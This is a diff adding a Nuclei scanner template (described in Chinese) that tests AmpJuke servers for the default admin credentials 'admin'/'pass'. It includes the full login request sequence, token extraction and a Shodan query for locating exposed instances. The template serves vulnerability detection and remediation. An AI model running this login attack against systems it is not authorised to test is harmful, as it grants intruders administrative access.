@@ -1,0 +1,59 @@
+id: ampjuke-default-login-credentials
+
+info:
+  name: AmpJuke 默认登录凭据漏洞
+  author: ritikchaddha
+  severity: high
+  description: |
+    AmpJuke 存在默认登录漏洞，其默认管理员登录口令为 'pass'，攻击者可借此直接获取后台访问权限。
+    参考链接：
+  metadata:
+    max-request: 3
+    shodan-query: "http.favicon.hash:-121681558"
+  tags: Allnet
+  remediation: >-
+    升级到已修复版本，并在服务端对每个受影响的操作和资源执行身份认证与授权检查。采用默认拒绝的访问控制策略，删除默认凭据，在可用时启用多因素认证，并限制管理端点的访问。
+
+http:
+  - raw:
+      - |
+        GET /login.php HTTP/1.1
+        Host: {{Hostname}}
+      - |
+        POST /loginvalidate.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        uuid={{url_encode(token)}}&login={{username}}&password={{password}}&Submit=Submit
+      - |
+        GET /index.php?what=welcome HTTP/1.1
+        Host: {{Hostname}}
+    attack: pitchfork
+    payloads:
+      username:
+        - admin
+      password:
+        - pass
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body_3
+        words:
+          - 'AmpJuke'
+          - 'Track'
+          - 'Logout'
+          - 'Random play'
+        condition: and
+        case-insensitive: true
+      - type: status
+        status:
+          - 200
+    extractors:
+      - type: regex
+        part: body_1
+        name: token
+        group: 1
+        regex:
+          - 'name="uuid" value="([./a-z0-9-]+)">'
+        internal: true
+        # digest: 4a0a004730450220192793481d66e9b4e93267371db4f3f5be275c31f6716eeae307dff942783168022100b5a454179aa6b76122cc2600453c2d72ef0dc743526f8303411d97f082362f06:922c64590222798bb761d5b6d8e72950
